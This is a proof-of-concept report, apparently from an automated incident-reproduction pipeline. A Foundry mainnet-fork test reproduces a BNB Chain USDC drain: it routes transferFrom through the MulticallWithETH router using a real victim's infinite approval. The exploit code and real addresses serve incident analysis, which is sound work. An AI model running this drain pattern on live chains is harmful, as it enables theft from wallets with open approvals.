# BNB Chain USDC Infinite-Approval Drain via MulticallWithETH — PoC Report

## 1. Overview & Context

This proof-of-concept (PoC) reproduces a real-world exploit on BNB Chain where an adversary drained a victim’s USDC balance by abusing an infinite ERC20 approval granted to the `MulticallWithETH` router. The PoC is implemented as a Foundry test that runs against a fork of BNB Chain at the ACT pre-state block.

- **Incident focus:** USDC (BEP20 proxy) on BNB Chain, drained via `MulticallWithETH.aggregate` using a previously granted infinite allowance from the victim.
- **Victim:** EOA that had granted `USDC.approve(spender=MulticallWithETH, amount=max_uint256)` and retained a large USDC balance.
- **Router:** `MulticallWithETH` contract, a permissionless aggregator that forwards arbitrary calldata.
- **Root cause category:** Operator error — the victim left an infinite USDC approval to a powerful router while holding substantial funds.

**Command to run the PoC:**

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.bsc.quiknode.pro/<QUICKNODE_TOKEN>" \
  forge test --via-ir -vvvvv
```

In the validation run, `RPC_URL` was set to a BNB Chain QuickNode endpoint and the test `ExploitTest::test_Exploit` passed on a mainnet fork.

## 2. PoC Architecture & Key Contracts

### 2.1 Main Contracts and Roles

- **Test harness:** `ExploitTest` (Foundry test contract in `test/Exploit.sol`).
- **Token:** `USDC` proxy on BNB Chain, represented by the `IUSDC` interface.
- **Router:** `MulticallWithETH` router on BNB Chain, represented by the `IMulticallWithETH` interface.
- **Victim:** Hard-coded victim EOA address taken from the incident, which has an infinite USDC allowance to the router and a large USDC balance at the forked block.
- **Attacker:** A fresh EOA generated within the test using Foundry utilities (`makeAddr`), not the real attacker address.

The interfaces used by the test are minimal and focused on the exploit surface:

```solidity
// From src/Interfaces.sol
interface IUSDC {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IMulticallWithETH {
    struct Call { address target; bytes callData; uint256 value; bool allowFailure; }
    struct Result { bool success; bytes returnData; }
    function aggregate(Call[] calldata calls) external payable returns (Result[] memory returnData);
}
```

These abstractions allow the PoC to call the real USDC proxy and Multicall router on the forked chain without any local mocks.

### 2.2 Test Contract and Core State

The main test contract wires these interfaces to the real mainnet addresses and defines the actor roles:

```solidity
// From test/Exploit.sol
contract ExploitTest is Test {
    // Mainnet BNB Chain (chainid 56) addresses from the incident.
    address internal constant VICTIM =
        0xfb0De204791110Caa5535aeDf4E71dF5bA68A581;
    address internal constant USDC_PROXY =
        0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant MULTICALL_ROUTER =
        0x3DA0F00d5c4E544924bC7282E18497C4A4c92046;

    IUSDC internal usdc = IUSDC(USDC_PROXY);
    IMulticallWithETH internal multicallWithETH =
        IMulticallWithETH(MULTICALL_ROUTER);

    // Fresh attacker EOA for the PoC (not the real incident address).
    address internal attacker;
}
```

**Caption:** Core PoC state wiring the real BNB Chain USDC proxy, MulticallWithETH router, and incident victim address, plus a fresh attacker EOA.

## 3. Adversary Execution Flow

### 3.1 Environment Setup and Funding

The `setUp` function prepares the forked environment at the ACT pre-state block, labels key addresses for readability, funds the attacker, and enforces all pre-check oracles.

```solidity
function setUp() public {
    // Fork BNB Chain at the pre-attack block where the victim has
    // a USDC balance and an infinite approval to MulticallWithETH.
    uint256 forkId =
        vm.createSelectFork(vm.envString("RPC_URL"), 55371342);
    vm.selectFork(forkId);

    attacker = makeAddr("attacker");

    vm.label(attacker, "Attacker");
    vm.label(VICTIM, "Victim");
    vm.label(USDC_PROXY, "USDC");
    vm.label(MULTICALL_ROUTER, "MulticallWithETH");

    // Fund attacker with BNB for gas on the fork.
    vm.deal(attacker, 1 ether);

    // Oracle pre-checks...
}
```

**Caption:** Environment setup on a BNB Chain mainnet fork at the documented ACT pre-state block, with attacker funding and address labels.

### 3.2 Oracle Pre-Checks (Pre-State Conditions)

Within `setUp`, the test enforces the pre-conditions described in the oracle definition:

- **Victim must hold USDC:** `victimBalanceBefore = usdc.balanceOf(VICTIM); assertGt(victimBalanceBefore, 0, ...)`.
- **Victim allowance to router must cover balance:** `assertGe(usdc.allowance(VICTIM, MULTICALL_ROUTER), victimBalanceBefore, ...)`.
- **Attacker starts with zero USDC:** `assertEq(usdc.balanceOf(attacker), 0, ...)`.
- **USDC proxy correctness:** `assertEq(address(usdc), USDC_PROXY, "USDC proxy address mismatch");`.

Together, these checks confirm that the forked state mirrors the ACT opportunity described in the incident: a USDC-rich victim with an infinite router approval, and a clean attacker starting with no USDC.

### 3.3 Exploit Construction and Execution

The core exploit flow builds a single `aggregate` call that routes a `USDC.transferFrom` from victim to attacker through the Multicall router, then executes it from the attacker EOA.

```solidity
function test_Exploit() public {
    uint256 victimBalanceBefore = usdc.balanceOf(VICTIM);
    uint256 attackerBalanceBefore = usdc.balanceOf(attacker);

    IMulticallWithETH.Call[]
        memory calls = new IMulticallWithETH.Call[](1);

    calls[0] = IMulticallWithETH.Call({
        target: USDC_PROXY,
        callData: abi.encodeWithSelector(
            IUSDC.transferFrom.selector,
            VICTIM,
            attacker,
            victimBalanceBefore
        ),
        value: 0,
        allowFailure: false
    });

    vm.expectCall(
        MULTICALL_ROUTER,
        abi.encodeWithSelector(
            IMulticallWithETH.aggregate.selector,
            calls
        )
    );

    reproducerAttack(calls);

    uint256 victimBalanceAfter = usdc.balanceOf(VICTIM);
    uint256 attackerBalanceAfter = usdc.balanceOf(attacker);

    assertGt(attackerBalanceAfter, attackerBalanceBefore, ...);
    assertLt(victimBalanceAfter, victimBalanceBefore, ...);
}

function reproducerAttack(IMulticallWithETH.Call[] memory calls) internal {
    vm.startPrank(attacker);
    multicallWithETH.aggregate(calls);
    vm.stopPrank();
}
```

**Caption:** End-to-end exploit test that routes a `USDC.transferFrom` drain from victim to attacker via `MulticallWithETH.aggregate` and asserts attacker profit plus victim loss.

The execution flow is:

1. Read victim and attacker USDC balances before the exploit.
2. Build a single `Call` for `aggregate`, targeting `USDC_PROXY` with calldata for `transferFrom(VICTIM, attacker, victimBalanceBefore)`.
3. Use `vm.expectCall` to assert that `MulticallWithETH.aggregate` is invoked with this `calls` array.
4. `reproducerAttack` starts a prank as the attacker, calls `multicallWithETH.aggregate(calls)`, and stops the prank.
5. After execution, read balances again and assert attacker profit and victim loss.

### 3.4 Profit Realization and Cleanup

- **Profit realization:** The attacker ends with a strictly higher USDC balance, equal (in the reproduced run) to the victim’s original balance at the forked block.
- **Victim depletion:** The victim’s USDC balance strictly decreases, reflecting the full drain observed in the incident.
- **Cleanup:** No additional cleanup is required; the test ends once assertions on balances and call paths succeed.

## 4. Oracle Definitions and Checks

This section maps the oracles defined in `oracle_definition.json` to concrete implementations in the PoC.

### 4.1 Variables

- **`attacker`** (role: Attacker): Fresh EOA generated inside the test via `makeAddr("attacker")`; starts with 0 USDC, then receives drained funds.
- **`victim`** (role: Victim): Hard-coded incident victim address `VICTIM` that holds USDC and has granted an infinite approval to the router.
- **`usdc`** (role: Token): USDC proxy contract at `USDC_PROXY`, accessed via the `IUSDC` interface.
- **`multicallWithETH`** (role: Protocol): Multicall router at `MULTICALL_ROUTER`, accessed via `IMulticallWithETH`.

### 4.2 Pre-Check Oracles

1. **Victim has positive USDC balance**
   - **Oracle description:** Victim must start with a positive USDC balance.
   - **Implementation:**
     ```solidity
     uint256 victimBalanceBefore = usdc.balanceOf(VICTIM);
     assertGt(
         victimBalanceBefore,
         0,
         "Victim must start with positive USDC balance"
     );
     ```
   - **Effect:** Ensures there is value to drain.

2. **Victim’s allowance to router covers balance**
   - **Oracle description:** Victim must have granted MulticallWithETH a USDC allowance at least as large as the current balance.
   - **Implementation:**
     ```solidity
     assertGe(
         usdc.allowance(VICTIM, MULTICALL_ROUTER),
         victimBalanceBefore,
         "Victim allowance to MulticallWithETH must cover balance"
     );
     ```
   - **Effect:** Confirms the router can spend the entire victim balance in a single `transferFrom`.

3. **Attacker starts with zero USDC**
   - **Oracle description:** Attacker should start with zero USDC.
   - **Implementation:**
     ```solidity
     assertEq(
         usdc.balanceOf(attacker),
         0,
         "Attacker should start with zero USDC"
     );
     ```
   - **Effect:** Makes post-exploit profit attributable solely to the exploit.

4. **USDC proxy hard constraint**
   - **Oracle description (hard-asset-usdc):** Profit must be realized in the real USDC proxy `0x8AC7...580d` on BNB Chain.
   - **Implementation:**
     ```solidity
     assertEq(address(usdc), USDC_PROXY, "USDC proxy address mismatch");
     ```
   - **Effect:** Ensures the test targets the correct token contract.

### 4.3 Hard Constraints

1. **Hard-asset-usdc**
   - **Specification:** Profit asset must be BNB Chain USDC proxy `0x8AC7...580d`.
   - **PoC implementation:**
     - `IUSDC internal usdc = IUSDC(USDC_PROXY);`
     - `assertEq(address(usdc), USDC_PROXY, ...)` in `setUp`.
   - **Result:** Satisfied.

2. **Hard-path-multicall-aggregate**
   - **Specification:** USDC `transferFrom(from=victim, to=attacker, amount>0)` must be triggered via `MulticallWithETH.aggregate`.
   - **PoC implementation:**
     - Builds `calls[0]` targeting `USDC_PROXY` with `transferFrom(VICTIM, attacker, victimBalanceBefore)` as calldata.
     - Uses `vm.expectCall(MULTICALL_ROUTER, abi.encodeWithSelector(IMulticallWithETH.aggregate.selector, calls));`.
     - Executes `multicallWithETH.aggregate(calls)` from the attacker via `reproducerAttack`.
   - **Result:** Satisfied; the forge trace confirms the aggregate call and subsequent `USDC.transferFrom` delegatecall path.

### 4.4 Soft Constraints

1. **soft-attacker-profit-usdc**
   - **Specification:** Attacker must end with strictly more USDC than before.
   - **PoC implementation:**
     ```solidity
     uint256 attackerBalanceBefore = usdc.balanceOf(attacker);
     // ... exploit ...
     uint256 attackerBalanceAfter = usdc.balanceOf(attacker);
     assertGt(
         attackerBalanceAfter,
         attackerBalanceBefore,
         "Attacker USDC balance must increase"
     );
     ```
   - **Result:** Satisfied; attacker balance increases by the drained amount.

2. **soft-victim-depletion-usdc**
   - **Specification:** Victim’s USDC balance must strictly decrease, ideally to zero.
   - **PoC implementation:**
     ```solidity
     uint256 victimBalanceBefore = usdc.balanceOf(VICTIM);
     // ... exploit ...
     uint256 victimBalanceAfter = usdc.balanceOf(VICTIM);
     assertLt(
         victimBalanceAfter,
         victimBalanceBefore,
         "Victim USDC balance must decrease"
     );
     ```
   - **Result:** Satisfied; in the reproduced run, the victim balance drops to zero while the attacker gains the same amount.

Overall, the PoC implements all pre-checks, both hard constraints, and both soft constraints from the oracle definition, with minor, acceptable flexibility (e.g., profit/loss thresholds expressed as strict inequalities rather than fixed raw units).

## 5. Validation Result and Robustness

The PoC was validated by running the Foundry test suite on a BNB Chain mainnet fork using the configured `RPC_URL`. The key outcomes are:

- **Test execution:**
  - `ExploitTest::test_Exploit` **passed**.
  - The forge trace shows the expected call sequence: environment setup, `MulticallWithETH.aggregate`, and underlying `USDC.transferFrom` from victim to attacker.
- **Oracle satisfaction:**
  - All pre-checks, hard constraints, and soft constraints from `oracle_definition.json` are enforced and satisfied by the test.
- **Quality checks:**
  - Human-readable comments and labels describe the flow and roles clearly.
  - No inappropriate magic numbers: addresses and the fork block are sourced from the incident; the USDC amount is derived from on-chain state.
  - Self-contained attacker: the PoC uses a fresh attacker address and locally constructed calldata, without replaying attacker-side artifacts.
  - Mainnet fork: the test uses `vm.createSelectFork(RPC_URL, 55371342)` and interacts with live protocol contracts, not mocks.

The validator stored the forge test output at:

```json
{
  "validator_test_log_path": "artifacts/poc/poc_validator/forge-test.log"
}
```

The structured validation result is recorded in `artifacts/poc/poc_validator/poc_validated_result.json` with `overall_status` set to `"Pass"`.

## 6. Linking PoC Behavior to Root Cause

The root cause analysis describes an ACT opportunity on BNB Chain where:

- A victim EOA holds a large USDC balance at the proxy `0x8AC7...580d`.
- The victim has granted `allowance(owner=victim, spender=MulticallWithETH)` equal to `uint256.max` via a prior `USDC.approve` transaction.
- `MulticallWithETH` is permissionless and can forward arbitrary calldata to USDC.
- An adversary contract (or EOA) can use `MulticallWithETH.aggregate` to call `USDC.transferFrom(from=victim, to=adversary, amount=remaining_balance)` and drain the victim’s USDC.

The PoC links directly to this root cause as follows:

- **ACT pre-state recreation:** `vm.createSelectFork(RPC_URL, 55371342)` positions the chain at the documented pre-state block where the victim’s USDC balance and allowance are set as described.
- **Victim configuration:** The test’s pre-checks confirm the victim balance and infinite approval, mirroring the observed chain state that enabled the exploit.
- **Exploit action (A):** The attacker, as a fresh EOA, constructs a `MulticallWithETH.aggregate` call with a single `USDC.transferFrom` targeting the victim and themselves as recipient.
- **Router mediation (C):** The PoC enforces that the execution path goes through `MulticallWithETH.aggregate` using `vm.expectCall`, matching the real transaction’s routing through the router.
- **Outcome (T):** After the call, the victim’s USDC balance strictly decreases (to zero), and the attacker’s balance increases by the same amount, matching the `balance_diff` evidence in the root cause report.

By using the actual victim, USDC proxy, and Multicall router addresses on a forked BNB Chain state, and by enforcing the oracle-defined pre-conditions and post-conditions, this PoC provides a faithful, end-to-end reproduction of the incident’s exploit path.

In conclusion, the PoC passes all defined correctness oracles and quality criteria, and is suitable as a reference reproduction of the BNB Chain USDC infinite-approval drain via `MulticallWithETH`.
